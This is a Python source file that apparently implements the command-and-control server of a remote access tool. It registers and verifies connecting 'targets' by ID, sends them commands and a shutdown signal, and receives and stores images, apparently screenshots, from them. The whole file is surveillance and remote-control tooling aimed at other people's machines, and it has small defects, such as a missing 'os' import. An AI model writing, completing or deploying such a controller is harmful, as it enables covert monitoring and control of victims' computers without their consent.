import socket
from colors import *
import struct
from id_handler import *
import struct

DEFAULT_TARGET_COUNT = 2

class Server:
    def __init__(self, target_count=DEFAULT_TARGET_COUNT):
        self.serverPort_ = 0
        self.serverAddress_ = ""
        self.serverSocket_ = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.targetCount_ = target_count
        self.serverSocket_.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.runProgram_ = True
        self.target_socket_db = {}
        self.id_target_db = {}
    def __del__(self):
        self.serverSocket_.close()
        for clientSocket in self.target_socket_db.values():
            clientSocket.close()
    def set(self, ip_address, port):
        self.serverPort_ = port
        self.serverAddress_ = ip_address
    def define_target(self, __target):
        return self.target_socket_db[__target]
    def disconnect_target(self, __target, __clientSocket):
        __clientSocket.close()
        self.target_socket_db[__target] = None
    def shut_down(self):
        try:
            for target, clientSocket in self.target_socket_db.items():
                clientSocket.send("0".encode())
                yellow(f"Sent shutdown command to {target}")
                clientSocket.close()
            self.runProgram_ = False
        finally:
            pass
    def send_command(self, command, target):
        try:
            clientSocket = self.define_target(target)
            sentBytes = clientSocket.send(command.encode())
            if sentBytes == 0:
                red(f"{target} disconnected")
                self.disconnect_target(target, clientSocket)
                return False
            return True
        except socket.error as e:
            red(f"Error while sending the command: {e}")
            return False
    def receive_image_length(self, target):
        try:
            clientSocket = self.define_target(target)
            data = clientSocket.recv(4)
            if not data:
                red("Failed to receive image length")
                self.disconnect_target(target, clientSocket)
                return False
            if len(data) < 4:
                red("Failed to receive image length")
                return False
            return struct.unpack('>I', data)[0]
        finally:
            pass
    def receive_image(self, file_index, target):
        clientSocket = self.define_target(target)
        image_length = self.receive_image_length(target)
        if image_length < 0:
            return False
        else:
            green(f"Image length received: {image_length}")
        buf = b''
        if not os.path.exists("img"):
            os.makedirs("img")

        while len(buf) < image_length:
            data = clientSocket.recv(image_length - len(buf))
            if not data:
                red("Failed to receive image. Target disconnected")
                self.disconnect_target(target, clientSocket)
                break
            buf += data
        
        if len(buf) != image_length:
            red("Failed to receive image")
            return False
        img = open(f"img/{file_index}.png", "wb")
        img.write(buf)
        img.close()
        green(f"Image received and saved as img/{file_index}.png")
        return True

    def start(self):
        read_ids(self.id_target_db)
        if self.id_target_db == {}:
            green("No targets found in the database")
        else:
            green("Targets found in the database")
            for target in self.id_target_db.values():
                red(f"Status {target}: Disconnected")
                self.target_socket_db[target] = None

        self.serverSocket_.bind((self.serverAddress_, self.serverPort_))    
        self.serverSocket_.listen(self.targetCount_)
        green(f"Server started on {self.serverAddress_}:{self.serverPort_}")
        yellow("Waiting for connection...")

        while self.runProgram_:
            clientSocket, clientAddress = self.serverSocket_.accept()
            green(f"Connection established with {clientAddress}")
            # Receive first the flag data from the client
            flag = clientSocket.recv(1).decode()
            
            if flag == "0": # Target is new. Later needs to be changed to a more secure way
                overwrite = "n"
                yellow(f"New target connected. Info: {clientAddress} ")
                yellow("Enter a target name for the new client (q to decline)\n")
                while True:
                    target = input("Target name: ")
                    if target == "":
                        red("Target name cannot be empty")
                        continue
                    if target in self.id_target_db.values():
                        red("Target name already exists")
                        overwrite = input("Do you want to overwrite the existing target? (y/n): ")
                        if overwrite == "y":
                            break
                        continue
                    break

                if target == "q": # If the user declines the connection
                    red("Connection declined")
                    clientSocket.send("0".encode())
                    clientSocket.close()
                    continue

                # Send ack flag to verify
                clientSocket.send("1".encode())
                # Genereate a custom target string that will correspond to the target
                if overwrite == "y":
                    new_id = modify_id(self.id_target_db, target)
                else:
                    new_id = generate_random_id()
                    add_id(self.id_target_db, target, new_id)
                clientSocket.send(new_id.encode())
                self.target_socket_db[target] = clientSocket
                green(f"New target {target} with the ID {new_id} added to the database")

            elif flag == "1": # If the client is not new
                id = clientSocket.recv(16).decode() # Receive the ID of the client
                target =  verify_id(id, self.id_target_db) # Verify the ID
                
                if target == False:
                    red("ID verification failed!")
                    clientSocket.send("0".encode())
                    clientSocket.close()
                    continue
                else:
                    green("ID verification successful")
                    green(f"Target name verified: {target}")
                    clientSocket.send("1".encode())
                    self.target_socket_db[target] = clientSocket
            else:
                red("Invalid flag received")
                clientSocket.close()
                continue